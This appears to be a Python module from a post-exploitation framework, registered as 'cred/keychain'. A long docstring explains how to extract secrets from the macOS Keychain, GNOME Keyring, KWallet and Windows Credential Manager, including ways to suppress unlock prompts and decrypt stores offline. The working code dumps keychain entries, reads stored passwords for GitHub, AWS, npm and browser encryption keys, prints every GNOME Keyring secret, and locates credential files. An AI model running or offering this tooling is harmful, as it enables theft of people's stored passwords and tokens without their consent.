"""STUB — OS keychain / credential-manager extraction.

Reads secrets stored in the operating system's credential store:
macOS Keychain, Linux libsecret/GNOME Keyring, Windows Credential Manager.

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

macOS KEYCHAIN
--------------
The Keychain stores passwords for websites, applications, and system services.
File location: ~/Library/Keychains/login.keychain-db  (SQLite, encrypted)

Method 1 — `security` CLI (simplest, no dependencies):
  List all entries:
    subprocess.run(["security", "dump-keychain", "-d", "login.keychain"],
                   capture_output=True, text=True)
  This triggers a user-confirmation dialog per item unless the keychain is
  already unlocked.  To suppress dialogs, unlock first:
    security unlock-keychain -p "USER_PASSWORD" ~/Library/Keychains/login.keychain

  Find a specific entry:
    security find-internet-password -g -s "example.com"   → internet pw
    security find-generic-password  -g -a "appname"        → generic pw

Method 2 — Security framework via ctypes (no dialogs if keychain is open):
  import ctypes, ctypes.util
  sec = ctypes.CDLL(ctypes.util.find_library("Security"))

  # Find generic passwords
  item_ref = ctypes.c_void_p()
  password_len = ctypes.c_uint32()
  password_data = ctypes.c_void_p()
  sec.SecKeychainFindGenericPassword(
      None,                          # default keychain
      len(service), service.encode(),
      len(account), account.encode(),
      ctypes.byref(password_len),
      ctypes.byref(password_data),
      ctypes.byref(item_ref),
  )
  password = ctypes.string_at(password_data, password_len)

Method 3 — keyring Python library (wraps Security.framework):
  import keyring
  pw = keyring.get_password("service_name", "account_name")
  # To dump all: iterate SecKeychainSearchCreateFromAttributes with wildcard attrs

Method 4 — Direct SQLite access (offline, needs login keychain unlocked):
  The keychain-db file is an SQLite database; tables include:
    genp (generic passwords), inet (internet passwords), cert, keys
  Rows contain encrypted blobs — decrypt with the user's Keychain master key
  derived from the login password via PBKDF2.  Tools like chainbreaker
  (https://github.com/n0fate/chainbreaker) automate this.


LINUX — GNOME Keyring / libsecret
----------------------------------
pip install secretstorage

  import secretstorage
  bus = secretstorage.dbus_init()                   # connects to session D-Bus
  collection = secretstorage.get_default_collection(bus)
  if collection.is_locked():
      collection.unlock()                           # may require user interaction

  for item in collection.get_all_items():
      label    = item.get_label()
      attrs    = item.get_attributes()              # dict of metadata
      secret   = item.get_secret().decode()         # plaintext after unlock
      print(label, attrs, secret)

  The keyring file lives at:
    ~/.local/share/keyrings/login.keyring  (GNOME, encrypted)
    ~/.local/share/keyrings/*.keyring

  Offline access to the encrypted .keyring file:
    Format: GnomeKeyring binary format; can decrypt with the user's login password.
    Tool reference: https://github.com/bertolinux/gnome-keyring-dump

KDE KWallet:
  qdbus org.kde.kwalletd5 /modules/kwalletd5 openWallet "kdewallet" 0
  Or Python via dbus:
    import dbus
    bus = dbus.SessionBus()
    wallet = bus.get_object("org.kde.kwalletd5", "/modules/kwalletd5")
    iface = dbus.Interface(wallet, "org.kde.KWallet")
    handle = iface.open("kdewallet", 0, "myapp")
    folders = iface.folderList(handle, "myapp")
    for folder in folders:
        keys = iface.entryList(handle, folder, "myapp")
        for key in keys:
            pw = iface.readPassword(handle, folder, key, "myapp")


WINDOWS — Credential Manager
------------------------------
Method 1 — cmdkey (shows stored entries, not passwords):
  cmdkey /list

Method 2 — ctypes calling CredEnumerateW (returns plaintext for Generic type):
  import ctypes, ctypes.wintypes

  CRED_TYPE_GENERIC = 1
  class CREDENTIAL(ctypes.Structure):
      _fields_ = [
          ("Flags",              ctypes.c_ulong),
          ("Type",               ctypes.c_ulong),
          ("TargetName",         ctypes.c_wchar_p),
          ("Comment",            ctypes.c_wchar_p),
          ("LastWritten",        ctypes.c_ulonglong),
          ("CredentialBlobSize", ctypes.c_ulong),
          ("CredentialBlob",     ctypes.POINTER(ctypes.c_byte)),
          ("Persist",            ctypes.c_ulong),
          ("AttributeCount",     ctypes.c_ulong),
          ("Attributes",         ctypes.c_void_p),
          ("TargetAlias",        ctypes.c_wchar_p),
          ("UserName",           ctypes.c_wchar_p),
      ]

  advapi32 = ctypes.windll.advapi32
  count = ctypes.c_ulong()
  creds_ptr = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()
  advapi32.CredEnumerateW(None, 0, ctypes.byref(count), ctypes.byref(creds_ptr))

  for i in range(count.value):
      cred = creds_ptr[i].contents
      blob = bytes(cred.CredentialBlob[j] for j in range(cred.CredentialBlobSize))
      print(cred.TargetName, cred.UserName, blob.decode("utf-16-le", errors="replace"))

  advapi32.CredFree(creds_ptr)

Method 3 — pywin32 (cleaner):
  import win32cred
  creds = win32cred.CredEnumerate(None, 0)
  for c in creds:
      print(c["TargetName"], c["UserName"],
            c["CredentialBlob"].decode("utf-16-le"))

Method 4 — DPAPI blobs in %APPDATA%\\Microsoft\\Credentials\\ :
  Files are DPAPI-encrypted; use CryptUnprotectData:
    ctypes.windll.crypt32.CryptUnprotectData(...)
  Or dpapick3 Python library for offline decryption with the master key.


OUTPUT FORMAT
-------------
Return a list of dicts:
  {"store": "keychain", "service": "...", "account": "...", "secret": "..."}
"""

import platform
import re
import subprocess
from pathlib import Path

from post.base import ModuleResult, PostModule
from post.loader import register


# ── macOS helpers ──────────────────────────────────────────────────────────────

def _macos_list_keychains() -> list[str]:
    try:
        r = subprocess.run(["security", "list-keychains", "-d", "user"],
                           capture_output=True, text=True, timeout=5)
        return [line.strip().strip('"') for line in r.stdout.splitlines() if line.strip()]
    except Exception:
        return []


def _macos_dump_keychain(path: str) -> list[dict]:
    """Dump keychain metadata (no secrets — avoids UI auth prompts)."""
    try:
        r = subprocess.run(["security", "dump-keychain", path],
                           capture_output=True, text=True, timeout=10)
    except Exception:
        return []

    entries: list[dict] = []
    current: dict = {}
    for line in r.stdout.splitlines():
        line = line.strip()
        if line.startswith("0x00000007") or '"desc"' in line:
            m = re.search(r'"([^"]+)"$', line)
            if m:
                current["description"] = m.group(1)
        elif '"acct"' in line:
            m = re.search(r'"([^"]+)"$', line)
            if m:
                current["account"] = m.group(1)
        elif '"svce"' in line:
            m = re.search(r'"([^"]+)"$', line)
            if m:
                current["service"] = m.group(1)
        elif '"srvr"' in line:
            m = re.search(r'"([^"]+)"$', line)
            if m:
                current["server"] = m.group(1)
        elif line.startswith("Class:"):
            if current:
                entries.append(current)
            klass = line.split(":", 1)[-1].strip()
            current = {"class": klass, "keychain": path}
    if current:
        entries.append(current)

    return entries


def _macos_find_internet_passwords() -> list[dict]:
    """Attempt to retrieve internet passwords for common services (non-interactive)."""
    # These calls only succeed if the keychain is already unlocked
    common_services = [
        "GitHub", "GitLab", "Bitbucket", "AWS", "npm",
        "Chrome Safe Storage", "Brave Safe Storage", "Edge Safe Storage",
    ]
    found: list[dict] = []
    for svc in common_services:
        try:
            r = subprocess.run(
                ["security", "find-generic-password", "-s", svc, "-w"],
                capture_output=True, text=True, timeout=3,
            )
            pw = r.stdout.strip()
            if pw and r.returncode == 0:
                found.append({"service": svc, "secret": pw})
        except Exception:
            pass
    return found


# ── Linux helpers ──────────────────────────────────────────────────────────────

def _linux_secretstorage() -> list[dict]:
    try:
        import secretstorage  # type: ignore[import]
        conn = secretstorage.dbus_init()
        col = secretstorage.get_default_collection(conn)
        if col.is_locked():
            return [{"error": "GNOME Keyring is locked — unlock the desktop session first"}]
        return [
            {
                "service": item.get_label(),
                "attributes": item.get_attributes(),
                "secret": item.get_secret().decode("utf-8", errors="replace"),
            }
            for item in col.get_all_items()
        ]
    except ImportError:
        return [{"error": "secretstorage not installed (pip install secretstorage)"}]
    except Exception as e:
        return [{"error": str(e)}]


def _linux_credential_files() -> list[dict]:
    """Find well-known credential files on Linux."""
    home = Path.home()
    candidates = [
        home / ".netrc",
        home / ".git-credentials",
        home / ".config" / "gh" / "hosts.yml",
        home / ".aws" / "credentials",
        home / ".docker" / "config.json",
        home / ".kube" / "config",
        Path("/etc/passwd"),
    ]
    found = []
    for p in candidates:
        if p.exists():
            stat = p.stat()
            found.append({"path": str(p), "size": stat.st_size, "mode": oct(stat.st_mode)})
    return found


# ── Module ─────────────────────────────────────────────────────────────────────

@register
class KeychainModule(PostModule):
    NAME        = "cred/keychain"
    DESCRIPTION = "Read secrets from macOS Keychain / GNOME Keyring credential stores"
    PLATFORM    = ["linux", "darwin"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:
        system = platform.system()
        lines: list[str] = []
        data: dict = {}

        if system == "Darwin":
            # Enumerate keychain metadata
            keychains = _macos_list_keychains()
            lines.append(f"Keychains: {len(keychains)}")
            for kc in keychains:
                lines.append(f"  {kc}")
            lines.append("")

            all_entries: list[dict] = []
            for kc in keychains:
                entries = _macos_dump_keychain(kc)
                all_entries.extend(entries)

            # Filter to entries with useful identity info
            interesting = [e for e in all_entries if e.get("account") or e.get("service")]
            lines.append(f"Keychain items with account/service info: {len(interesting)}")
            for e in interesting[:50]:  # cap output
                parts = []
                if e.get("service"):
                    parts.append(f"service={e['service']}")
                if e.get("server"):
                    parts.append(f"server={e['server']}")
                if e.get("account"):
                    parts.append(f"account={e['account']}")
                lines.append("  " + "  ".join(parts))

            lines.append("")
            lines.append("Attempting retrieval of common service passwords:")
            found_pw = _macos_find_internet_passwords()
            for f in found_pw:
                lines.append(f"  {f['service']}: {f['secret']}")
            if not found_pw:
                lines.append("  (none retrieved — keychain may require authorization)")

            data = {"keychains": keychains, "items": interesting, "retrieved": found_pw}

        elif system == "Linux":
            lines.append("Attempting GNOME Keyring via secretstorage...")
            items = _linux_secretstorage()
            for item in items:
                if "error" in item:
                    lines.append(f"  ! {item['error']}")
                else:
                    lines.append(f"  [{item.get('service', '?')}] {item.get('secret', '')}")

            lines.append("")
            lines.append("Well-known credential files:")
            cred_files = _linux_credential_files()
            for f in cred_files:
                lines.append(f"  {f['path']} (mode={f['mode']}, {f['size']}B)")

            data = {"secretstorage_items": items, "credential_files": cred_files}

        else:
            return ModuleResult(ok=False, output="", error=f"Unsupported: {system}")

        return ModuleResult(ok=True, output="\n".join(lines), data=data)
